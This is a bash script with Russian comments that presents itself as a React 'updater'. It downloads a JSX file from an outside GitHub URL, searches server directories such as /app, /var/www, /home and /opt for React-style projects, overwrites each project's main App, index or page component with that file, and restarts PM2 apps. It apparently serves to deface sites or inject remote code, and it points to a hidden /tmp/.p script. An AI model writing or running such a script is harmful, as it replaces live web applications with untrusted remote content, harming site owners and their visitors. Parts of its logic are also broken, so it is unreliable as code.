#!/bin/bash
# minimal_updater.sh - Обновленная версия с поддержкой /app

set -e

# Цвета (если терминал поддерживает)
[ -t 1 ] && RED='\033[0;31m' GREEN='\033[0;32m' YELLOW='\033[1;33m' BLUE='\033[0;34m' NC='\033[0m' || RED='' GREEN='' YELLOW='' BLUE='' NC=''

log() { echo -e "${GREEN}$(date '+%H:%M:%S') $1${NC}"; }
warn() { echo -e "${YELLOW}WARN: $1${NC}"; }
info() { echo -e "${BLUE}INFO: $1${NC}"; }

# Ссылки
HOMEPAGE_URL="https://raw.githubusercontent.com/nik2708/test/refs/heads/main/updatereact.jsx"
TEMP_FILE="/tmp/react_homepage_$$.jsx"

# Определяем загрузчик
if command -v curl >/dev/null; then
    download() { curl -s -L -o "$2" "$1"; }
elif command -v wget >/dev/null; then
    download() { wget -q -O "$2" "$1"; }
else
    echo "ERROR: Нужен curl или wget" >&2
    exit 1
fi

# Дополнительные проверки React проектов
is_react_project() {
    local dir="$1"
    
    # Проверяем package.json
    if [ ! -f "$dir/package.json" ]; then
        return 1
    fi
    
    # Проверяем наличие react в dependencies или devDependencies
    if grep -q '"react"' "$dir/package.json" 2>/dev/null || \
       grep -q '"next"' "$dir/package.json" 2>/dev/null || \
       grep -q '"gatsby"' "$dir/package.json" 2>/dev/null || \
       grep -q '"@remix-run"' "$dir/package.json" 2>/dev/null; then
        return 0
    fi
    
    # Дополнительная проверка - наличие src или public директории
    if [ -d "$dir/src" ] || [ -d "$dir/public" ] || [ -f "$dir/next.config.js" ]; then
        return 0
    fi
    
    return 1
}

# Находим главный компонент
find_main_component() {
    local dir="$1"
    
    # Попробуем сначала определить по package.json
    if [ -f "$dir/package.json" ]; then
        # Пробуем найти main в package.json
        local main_entry=$(grep -o '"main": *"[^"]*"' "$dir/package.json" | head -1 | cut -d'"' -f4)
        if [ -n "$main_entry" ]; then
            local base_main=$(basename "$main_entry" .js)
            base_main=$(basename "$base_main" .jsx)
            
            # Ищем App компонент в той же директории
            local main_dir=$(dirname "$main_entry")
            local possible_apps=(
                "$main_dir/App.jsx"
                "$main_dir/App.js"
                "$main_dir/App.tsx"
                "$main_dir/App.ts"
                "src/App.jsx"
                "src/App.js"
                "src/App.tsx"
                "src/App.ts"
            )
            
            for app in "${possible_apps[@]}"; do
                if [ -f "$dir/$app" ]; then
                    echo "$app"
                    return 0
                fi
            done
        fi
    fi
    
    # Стандартный список для поиска
    local components=(
        "src/App.jsx"
        "src/App.js"
        "src/App.tsx"
        "src/App.ts"
        "src/index.jsx"
        "src/index.js"
        "src/index.tsx"
        "src/index.ts"
        "app/page.jsx"
        "app/page.js"
        "app/page.tsx"
        "app/page.ts"
        "pages/index.jsx"
        "pages/index.js"
        "pages/index.tsx"
        "pages/index.ts"
        "App.jsx"
        "App.js"
        "App.tsx"
        "App.ts"
    )
    
    for comp in "${components[@]}"; do
        if [ -f "$dir/$comp" ]; then
            echo "$comp"
            return 0
        fi
    done
    
    # Ищем любой файл с App в названии в src/
    local found_app=$(find "$dir/src" -name "App.*" -type f \( -name "*.js" -o -name "*.jsx" -o -name "*.ts" -o -name "*.tsx" \) 2>/dev/null | head -1)
    if [ -n "$found_app" ]; then
        echo "${found_app#$dir/}"
        return 0
    fi
    
    # Ищем любой файл с index в названии в src/
    local found_index=$(find "$dir/src" -name "index.*" -type f \( -name "*.js" -o -name "*.jsx" -o -name "*.ts" -o -name "*.tsx" \) 2>/dev/null | head -1)
    if [ -n "$found_index" ]; then
        echo "${found_index#$dir/}"
        return 0
    fi
    
    return 1
}

# Директории для поиска (добавлен /app в начало)
SEARCH_DIRS=(
    "/app"
    "/var/www"
    "/home"
    "/opt"
    "/usr/share/nginx"
    "/srv"
    "/web"
    "/var/app"
    "$(pwd)"
)

# Загружаем новую страницу
log "Загрузка: $HOMEPAGE_URL"
download "$HOMEPAGE_URL" "$TEMP_FILE" || { echo "ERROR: Не загрузилось"; exit 1; }

# Проверяем что файл похож на React компонент
if ! grep -q "import React\|from 'react'\|function.*Component\|const.*=.*()" "$TEMP_FILE" 2>/dev/null; then
    warn "Внимание: Загруженный файл может не быть React компонентом"
    read -p "Продолжить? (y/N): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        rm -f "$TEMP_FILE"
        exit 1
    fi
fi

# Ищем React проекты
log "Поиск React проектов..."
PROJECTS_FOUND=0
PROJECTS_UPDATED=0

# Собираем все уникальные директории из SEARCH_DIRS
for search_dir in "${SEARCH_DIRS[@]}"; do
    # Проверяем существует ли директория
    if [ ! -d "$search_dir" ]; then
        continue
    fi
    
    info "Сканируем: $search_dir"
    
    # Ищем package.json файлы
    find "$search_dir" -maxdepth 5 -name "package.json" -type f 2>/dev/null | while read -r pkg; do
        dir=$(dirname "$pkg")
        
        # Пропускаем node_modules
        if [[ "$dir" == *"node_modules"* ]]; then
            continue
        fi
        
        # Проверяем что это React проект
        if is_react_project "$dir"; then
            ((PROJECTS_FOUND++))
            log "Найден React проект [$PROJECTS_FOUND]: $dir"
            
            # Находим главный компонент
            main_comp=$(find_main_component "$dir")
            
            if [ -n "$main_comp" ]; then
                target_file="$dir/$main_comp"
                
                # Создаем бэкап
                backup_file="$target_file.backup.$(date +%s)"
                cp "$target_file" "$backup_file"
                
                # Заменяем
                cp "$TEMP_FILE" "$target_file"
                log "  ✅ Обновлен: $main_comp (бэкап: $backup_file)"
                ((PROJECTS_UPDATED++))
                
                # Пытаемся перезапустить проект если есть скрипты
                if [ -f "$dir/package.json" ]; then
                    cd "$dir"
                    
                    # Проверяем, используется ли PM2
                    if command -v pm2 >/dev/null 2>&1; then
                        pm2_app=$(pm2 list | grep "$dir" | awk '{print $2}')
                        if [ -n "$pm2_app" ]; then
                            warn "  Перезапуск PM2: $pm2_app"
                            pm2 restart "$pm2_app" --silent || true
                        fi
                    fi
                    
                    # Проверяем наличие npm scripts
                    if grep -q '"start"' "$dir/package.json" || grep -q '"dev"' "$dir/package.json"; then
                        warn "  ВНИМАНИЕ: Проект использует npm scripts. Может потребоваться ручной перезапуск."
                        warn "  Команда для ручного перезапуска: cd $dir && npm start"
                    fi
                fi
            else
                warn "  ⚠️ Не найден главный компонент"
            fi
        fi
    done
done

# Итог
log "========================================"
log "ПОИСК ЗАВЕРШЕН"
log "Найдено проектов: $PROJECTS_FOUND"
log "Обновлено проектов: $PROJECTS_UPDATED"

if [ $PROJECTS_UPDATED -eq 0 ]; then
    warn "⚠️ Не обновлено ни одного проекта!"
    warn "Возможные причины:"
    warn "1. React проекты не найдены в стандартных директориях"
    warn "2. Главный компонент не найден"
    warn "3. У вас нет прав на запись"
    echo ""
    warn "Директории поиска: ${SEARCH_DIRS[*]}"
    echo ""
    info "Чтобы добавить свою директорию для поиска:"
    info "export SEARCH_DIRS='/app /my/custom/path' && sh /tmp/.p/updatesoftware.sh"
fi

# Очистка
rm -f "$TEMP_FILE"
log "Готово!"
